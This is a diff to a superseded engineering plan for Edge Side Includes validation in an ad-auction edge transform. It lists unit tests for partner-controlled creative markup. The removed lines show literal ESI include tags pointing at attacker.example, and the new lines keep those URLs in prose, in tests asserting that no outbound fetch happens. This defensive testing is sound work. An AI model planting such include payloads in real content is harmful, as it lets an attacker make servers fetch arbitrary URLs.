@@ -1,11 +1,12 @@
 # #1009 ESI Validation Spike
 
-> **Superseded, 2026-08-12.** This document records the investigation, including the
-> parser/subrequest and client-fill arms that were later removed. The accepted implementation
-> keeps the public `esi` spelling but uses Fastly C2 plus exact byte-seam assembly. See
+> **HISTORICAL SPIKE — DO NOT IMPLEMENT.** This document records the investigation,
+> including executable ESI tags, parser/subrequests, and a client-fill arm that were all
+> removed. Every unchecked item below is historical, not remaining work. The accepted
+> implementation keeps the public `esi` spelling but uses Fastly C2 plus exact byte-seam
+> assembly. See
 > [the merge-hardening design](../specs/2026-08-12-1009-esi-merge-hardening-design.md) and
-> [implementation plan](./2026-08-12-1009-esi-merge-hardening.md). Unchecked items below are
-> historical experiments, not remaining work for the merged design.
+> [implementation plan](./2026-08-12-1009-esi-merge-hardening.md).
 
 > **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development
 > (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps
@@ -357,8 +358,8 @@ consenting first fill serves ad markup to a user who refused.
 | GPT diagnostics bootstrap | **Fragment** — gated on a per-request cookie/query |
 
 Emit **one** unconditional marker at the body-close seam, identical on every request that
-reaches the transform. Under `Esi` it is an `<esi:include>`; under `ClientFill` it is
-nothing at all, with the client fetching unprompted.
+reaches the transform. Under `Esi` it is an executable ESI include tag; under
+`ClientFill` it is nothing at all, with the client fetching unprompted.
 
 - [ ] **Step 3: Bypass C2 for anything that must not be shared**
 
@@ -696,7 +697,7 @@ for the silent-empty-bids trap, which applies in full.
 - [x] **Step 0: the mechanism works — DONE.** `9539061e`, hardened in `0597f54e`.
 
 Verified under Viceroy with the real `esi` 0.7 crate rather than argued from docs: a
-template carrying the `</body>` seam's own `esi:include` comes back with the fragment
+template carrying the `</body>` seam's own ESI include tag comes back with the fragment
 spliced in its place and no unresolved tag left.
 
 **The async/sync obstacle is dissolved, not worked around.** `esi`'s fragment dispatcher
@@ -718,7 +719,7 @@ ESI), `max_include_depth = 1`, and rendered caching / `edge_control` off because
 publisher path owns those headers.
 
 Nine tests. Four assert the configuration; the rest assert behaviour, including that a
-fragment containing its own `esi:include` is spliced as text rather than dispatched, so
+fragment containing its own nested ESI include is spliced as text rather than dispatched, so
 auction data cannot drive fragment requests.
 
 **What remains is the call site**, below. Emitting the include and resolving it are both
@@ -771,8 +772,8 @@ host and panics on a hostless URL — never use it.
 
 Rationale in the spec's §2: bid payloads carry partner-controlled creative markup, so a
 recursive parse would let an SSP make the edge fetch an arbitrary URL. **Add a unit test
-that feeds `<esi:include src="http://attacker.example/">` through a creative payload and
-asserts no fetch is attempted.**
+that feeds a partner-controlled ESI include targeting `http://attacker.example/` through
+a creative payload and asserts no fetch is attempted.**
 
 - [ ] **Step 3: The fragment must be a script, not the JSON endpoint**
 
@@ -805,11 +806,12 @@ Three more things the naïve marker gets wrong:
 
 An exact-path allowlist alone permits `https://attacker.example/_ts/page-bids`. Validate
 **scheme, authority, method, path, and query** — or better, ignore the marker's URL
-entirely and dispatch to a fixed internal backend, treating the `esi:include` as a signal
+entirely and dispatch to a fixed internal backend, treating the ESI include as a signal
 rather than an address.
 
-Add a test that feeds `<esi:include src="https://attacker.example/_ts/page-bids" />`
-through a creative payload and asserts no outbound fetch is attempted.
+Add a test that feeds an ESI include targeting
+`https://attacker.example/_ts/page-bids` through a creative payload and asserts no
+outbound fetch is attempted.
 
 - [ ] **Step 5: Deterministic synthetic fragment first**
 
@@ -857,7 +859,7 @@ Not a phase. Every one of these is a hard fail, independent of any performance r
       check.
 - [ ] **Request collapsing** works: concurrent cold requests transform once.
 - [x] **DCA disabled** DONE — `0597f54e`. Config asserted _and_ behaviour: a fragment
-      carrying its own `esi:include` is spliced as text rather than dispatched.
+      carrying its own nested ESI include is spliced as text rather than dispatched.
 
 - [ ] **Request collapsing** — not tested, and not testable here. Viceroy is
       single-threaded, so the concurrent cold-request case cannot be produced. The racing
